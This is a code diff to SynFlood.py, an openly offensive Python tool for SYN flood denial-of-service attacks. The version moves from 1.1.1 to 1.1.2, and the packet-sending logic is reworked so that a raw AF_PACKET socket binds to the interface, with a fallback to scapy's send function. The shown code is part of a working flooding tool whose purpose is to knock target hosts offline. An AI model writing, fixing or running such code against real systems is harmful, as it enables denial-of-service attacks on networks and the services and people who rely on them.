@@ -50,7 +50,7 @@ KeyboardInterrupt
 [2016-06-22 12:35:25] CRITICAL (50) {__main__ - SynFlood.py:199} End of the SynFlood attack.
 """
 
-__version__ = "1.1.1"
+__version__ = "1.1.2"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -240,10 +240,14 @@ def synflood(
     if IS_LINUX:
         packet = Ether() / packet
         sock = socket(AF_PACKET, SOCK_RAW)
-        sock.bind((iface, 0))
-        send_ = sock.send
+        try:
+            sock.bind((iface.ip, 0))
+        except OSError:
+            send_ = partial(send, iface=iface, verbose=0)
+        else:
+           send_ = sock.send
     else:
-        send_ = partial(send, verbose=0)
+        send_ = partial(send, iface=iface, verbose=0)
 
     logger_debug("Add raw data...")
     if data:
